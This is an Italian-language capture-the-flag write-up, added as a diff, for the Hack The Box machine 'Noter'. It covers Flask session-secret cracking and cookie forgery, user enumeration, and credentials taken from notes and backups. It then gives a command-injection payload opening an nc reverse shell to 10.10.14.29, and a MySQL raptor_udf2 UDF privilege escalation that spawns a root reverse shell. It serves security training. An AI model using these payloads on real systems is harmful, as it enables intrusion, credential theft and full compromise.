@@ -1,0 +1,425 @@
+#+TITLE: HTB Noter
+#+AUTHOR: Leonardo Tamiano
+
+* Enumeration
+** nmap
+*** nmap -sC -sV noter
+    #+begin_example
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-14 18:16 CEST
+Stats: 0:00:00 elapsed
+Nmap scan report for noter (10.129.56.41)
+Host is up (0.12s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
+|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
+|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
+5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
+|_http-title: Noter
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.13 seconds
+
+#+end_example
+*** nmap -p- noter
+ #+begin_example
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-14 18:16 CEST
+Not shown: 65529 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE
+21/tcp    open     ftp
+22/tcp    open     ssh
+5000/tcp  open     upnp
+23681/tcp filtered unknown
+24133/tcp filtered unknown
+51374/tcp filtered unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 727.87 seconds
+
+ #+end_example
+
+** webapp
+*** registration request
+    Possiamo registrarci nella webapp tramite l'url
+    ~http://noter:5000/register~ con le credenziali
+   
+    #+begin_example
+   leonardo:password
+    #+end_example
+   
+    andando ad eseguire la seguente richiesta con ~curl~
+
+    #+begin_src sh
+curl 'http://noter:5000/register' \
+  -H 'Proxy-Connection: keep-alive' \
+  -H 'Cache-Control: max-age=0' \
+  -H 'Upgrade-Insecure-Requests: 1' \
+  -H 'Origin: http://noter:5000' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36' \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
+  -H 'Referer: http://noter:5000/register' \
+  -H 'Accept-Language: en-US,en;q=0.9' \
+  --data-raw 'name=leonardo&email=leo%40test.it&username=leonardo&password=password&confirm=password' \
+  --compressed \
+  --insecure   
+    #+end_src
+   
+    a questo punto possiamo entrare e vedere che le note possono essere
+    visualizzate andando a vedere i seguenti URLs
+
+    #+begin_example
+http://noter:5000/note/3/
+http://noter:5000/note/4/
+http://noter:5000/note/5/   
+    #+end_example
+
+    dato che l'id finale dell'URL parte da 3, e viene incrementato di
+    uno per ogni creazione di una nuova nota, questo significa che
+    possiamo assumere che ci siano due note create da altri utenti.
+
+   ---------------------------------
+
+*** cookie management con flask-unsign
+    Per gestire l'autenticazione la webapp utilizza un cookie
+
+    #+begin_example
+GET /dashboard HTTP/1.1
+Host: noter:5000
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://noter:5000/login
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: session=.eJwlx0sKwCAMBcCrhLf2BN6kFBHR9APWgFG6EO9eoathBvyRg16ssPsAtQW0x8iqMNikU6hMRV7Kcp6c6C5w0xn89au21c4GXbmW8DAsMksJNQnmByyPISk.YyICyQ.n5ga3I-6Mtp3T9pJF_rTiZzq0GQ
+Connection: close
+    
+    #+end_example
+
+    Per decodificare il cookie possiamo utilizzare un tool chiamato
+    [[https://github.com/Paradoxis/Flask-Unsign.git][flask-unsign]].
+
+    #+begin_src sh
+leo@kali:~/repos/noter$ flask-unsign --decode --cookie '.eJwlx0sKwCAMBcCrhLf2BN6kFBHR9APWgFG6EO9eoathBvyRg16ssPsAtQW0x8iqMNikU6hMRV7Kcp6c6C5w0xn89au21c4GXbmW8DAsMksJNQnmByyPISk.YyICyQ.n5ga3I-6Mtp3T9pJF_rTiZzq0GQ'
+{'_flashes': [('success', 'You are now logged in')], 'logged_in': True, 'username': 'leonardo'}    
+    #+end_src
+
+    Notiamo che il campo ~_flashes~ potrebbe non esserci, in quanto
+    viene utilizzato dalla webapp per mostrare messaggi "flash" che
+    poi spariscono e non sono più mostrati.
+
+    #+begin_src sh
+flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibGVvbmFyZG8ifQ.YyICyQ.OKZe_Q_KFFsmDNF1vi3Ewbl7pRU'
+{'logged_in': True, 'username': 'leonardo'}    
+    #+end_src
+
+    Per trovare il segreto utilizzato per firmare il cookie possiamo
+    procedere come segue
+    
+    #+begin_src sh
+leo@kali:~/repos/noter$ flask-unsign --wordlist ~/repos/wordlists/rockyou.txt --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibGVvbmFyZG8ifQ.YyICyQ.OKZe_Q_KFFsmDNF1vi3Ewbl7pRU' --no-literal-eval
+[*] Session decodes to: {'logged_in': True, 'username': 'leonardo'}
+[*] Starting brute-forcer with 8 threads..
+[+] Found secret key after 17536 attempts
+b'secret123'    
+    #+end_src
+
+    Come possiamo vedere, il segreto è ~secret123~.
+
+    con questo segreto possiamo firmare dei nostri cookie
+    arbitrary. AD esempio possiamo firmare il seguente cookie, che
+    dice al server che siamo loggati come l'utente ~leo~.
+
+    #+begin_src sh
+leo@kali:~/repos/noter$ flask-unsign --sign --cookie "{'logged_in': True, 'username': 'leo'}" --secret "secret123"
+eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibGVvIn0.YyIFbg.KkT1F41O743dlVYSmjZ7Ztnzulk
+    #+end_src
+
+*** user enumeration con wfuzz
+    Per enumerare gli utenti della macchina possiamo utilizzare
+    l'information leakage introdotto dalla pagina di login.
+
+    In particolare, un login con un username esistente ma una password
+    sbagliata ritorna il valore "Invalid Login", mentre un login con
+    un username non esistente e una password sbagliata ritorna il
+    valore "Invalid credentials".
+
+    Utilizzando un tool di web fuzzing come ~wfuzz~ siamo in grado di
+    enumerare gli utenti del sistema.
+
+    #+begin_example
+leo@kali:~/repos/noter/data$ wfuzz -z file,xato-net-10-million-usernames.txt -d "username=FUZZ&password=" --ss "Invalid login" http://noter:5000/login
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+Target: http://noter:5000/login
+Total requests: 8295455
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                          
+=====================================================================
+
+000000113:   200        68 L     110 W      2022 Ch     "blue"                                                                           
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total time: 0
+Processed Requests: 390
+Filtered Requests: 389
+Requests/sec.: 0    
+    #+end_example
+
+    Abbiamo trovato l'utente ~blue~. Andandoci a creare un cookie con
+    questo utente otteniamo
+    
+    #+begin_src sh
+leo@kali:~/repos/noter/data$ flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret "secret123"
+eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YyIJGA.NQCbWG_TsjwWSqoYAJ5tiHZRNoQ    
+    #+end_src
+
+    e impostandolo come cookie vediamo le note di blue.
+
+*** blue's notes
+
+    - *Noter Premium Membership*
+      
+      #+begin_example
+
+    Hello, Thank you for choosing our premium service. Now you are capable of
+doing many more things with our application. All the information you are going
+to need are on the Email we sent you. By the way, now you can access our FTP
+service as well. Your username is 'blue' and the password is 'blue@Noter!'.
+Make sure to remember them and delete this.  
+(Additional information are included in the attachments we sent along the
+Email)  
+  
+We all hope you enjoy our service. Thanks!  
+  
+ftp_admin      
+      #+end_example
+    
+    - *Before the weekend*
+
+      #+begin_example
+Delete the password note  
+Ask the admin team to change the password      
+      #+end_example
+
+*** code review for RCE
+    La versione del codice che gira nel backup è il backup più recente
+    tra i due, ovvero ~app_backup_1638395546.zip~ in quanto contiene
+    anche il codice per la gestione degli endpoint tipo ~/export_note~.
+
+    Come possiamo vedere, la funzione pericolosa è la funzione
+    ~export_note_remote~ in quanto contiene la chiamata a ~subprocess.run~
+    
+    #+begin_src python
+r = pyrequest.get(url,allow_redirects=True)
+rand_int = random.randint(1,10000)
+command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
+subprocess.run(command, shell=True, executable="/bin/bash")
+    #+end_src
+
+    Possiamo controllare il valore di ~r.text.strip()~ in quanto è
+    ottenuto facendo una GET ad un ~url~ che scelgiamo noi. L'unico
+    filtro che viene effettuato è dalla funzione ~parse_url~
+
+    #+begin_src python
+    if check_VIP(session['username']):
+        try:
+            url = request.form['url']
+
+            status, error = parse_url(url)
+
+            if (status is True) and (error is None):
+    
+    #+end_src
+
+    La funzione però non fa altro che controllare che l'url inizia con
+    "http://" o "https://" e che finisca con ".md"
+
+    #+begin_src python
+def parse_url(url):
+    url = url.lower()
+    if not url.startswith ("http://" or "https://"):
+        return False, "Invalid URL"    
+
+    if not url.endswith('.md'):
+            return False, "Invalid file type"
+
+    return True, None
+    
+    #+end_src
+
+    Per exploitare infine dobbiamo capire come bypassare la
+    costruzione della stringa. L'idea è quella di utilizzare il
+    seguente payload
+    
+    #+begin_example
+' ; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.29 4321 >/tmp/f #     
+    #+end_example
+
+    Da mettere in un file ~hello.md~, attivare un web server, e
+    richiedere la risorsa dalla pagina ~export notes~ per attivare una
+    reverse shell.
+
+** ftp
+*** ftp as blue
+    Utilizzando le credenziali possiamo loggare nel server ftp.
+    
+    #+begin_example
+blue:blue@Noter!    
+    #+end_example
+
+    #+begin_src sh
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
+-rw-r--r--    1 1002     1002        12569 Dec 24  2021 policy.pdf
+226 Directory send OK.
+ftp> get policy.pdf
+local: policy.pdf remote: policy.pdf
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for policy.pdf (12569 bytes).
+226 Transfer complete.
+12569 bytes received in 0.00 secs (4.4085 MB/s)    
+    #+end_src
+
+    Possiamo vedere un file ~policy.pdf~.
+
+    Leggendolo, c'è scritto che le password di default hanno la struttura
+    
+    #+begin_example
+    username@site_name!
+    #+end_example
+
+*** ftp as ftp_admin
+    Utilizzando le credenziali di defualt dell'utente ~ftp_admin~ possiamo loggare nel server ftp.
+
+    #+begin_example
+ftp_admin:ftp_admin@Noter!    
+    #+end_example
+
+    #+begin_src sh
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
+-rw-r--r--    1 1003     1003        26298 Dec 01  2021 app_backup_1638395546.zip
+226 Directory send OK.    
+    #+end_src
+
+    Come possiamo vedere abbiamo due zip, che sono dei backup
+    dell'applicazione che gira nel backend.
+
+** mysql
+*** creds
+    Prese da ~app_backup_1635803546/app.py~
+
+    #+begin_src python
+# Config MySQL
+app.config['MYSQL_HOST'] = 'localhost'
+app.config['MYSQL_USER'] = 'root'
+app.config['MYSQL_PASSWORD'] = 'Nildogg36'
+app.config['MYSQL_DB'] = 'app'
+app.config['MYSQL_CURSORCLASS'] = 'DictCursor'    
+    #+end_src
+* PrivEsc
+** mysql
+   Per vedere la presenza del processo mysql
+   
+   #+begin_example
+svc@noter:/tmp$ netstat -ltpn
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      1248/python3        
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::21                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                      
+   #+end_example
+
+   Ci possiamo loggare con le creds trovate prima
+   
+   #+begin_src sh
+mysql -u root -pNildogg36      
+   #+end_src
+
+   Per vedere che il processo mysql gira come root possiamo utilizzare
+   la keyword ~OUTIFLE~.
+   
+   #+begin_src sql
+select 1 into OUTFILE '/tmp/test2';
+   #+end_src
+
+   #+begin_src sh
+svc@noter:/tmp$ ls -lha /tmp/test2
+-rw-r--r-- 1 root root 2 Sep 14 18:07 /tmp/test2   
+   #+end_src
+
+   ------------------------
+   
+   Per diventare root l'idea è quella di caricare in memoria una
+   libreria dinamica (~.so~). Questo funziona in quanto il processo
+   mysql che gira in remoto gira come l'utente ~root~ e quindi posso
+   scrivere in una sottocartella di ~/usr/lib~ su cui tipicamente solo
+   root può scrivere.
+
+   Riferimento: [[https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c][raptor_udf2.c]]
+
+   Dopo aver caricato il sorgente nella macchina remota tramite ~nc~ lo
+   compiliamo in un ~.so~ nella cartella ~/tmp~, andando quindi a creare
+   il file ~/tmp/raptor_udf2.so~
+
+   #+begin_src sh
+gcc -g -c raptor_udf2.c
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc   
+   #+end_src
+
+   e poi effettuiamo il login in ~mysql~ con le credenziali prese dalla webapp
+
+   #+begin_src sh
+mysql -u root -pNildogg36   
+   #+end_src
+
+   Una volta dentro effettuiamo i seguenti comandi
+
+   #+begin_src sql
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/tmp/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+select * from mysql.func;   
+   #+end_src
+
+   Dove la path ~'/usr/lib/x86_64-linux-gnu/mariadb19/plugin/~ è stata
+   ottenuta dal seguente comando
+
+   #+begin_example
+MariaDB [mysql]> show variables like '%plugin%';
++-----------------+---------------------------------------------+
+| Variable_name   | Value                                       |
++-----------------+---------------------------------------------+
+| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
+| plugin_maturity | gamma                                       |
++-----------------+---------------------------------------------+
+2 rows in set (0.002 sec)   
+   #+end_example
+   
+   alla fine possiamo chiamare una reverse shell tramite la funzione
+   caricata ~do_system()~
+   
+   #+begin_src sql
+select do_system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.29 4321 >/tmp/f   ');   
+   #+end_src
+
+   per ottenere una reverse shell da root.
+
+* Flags
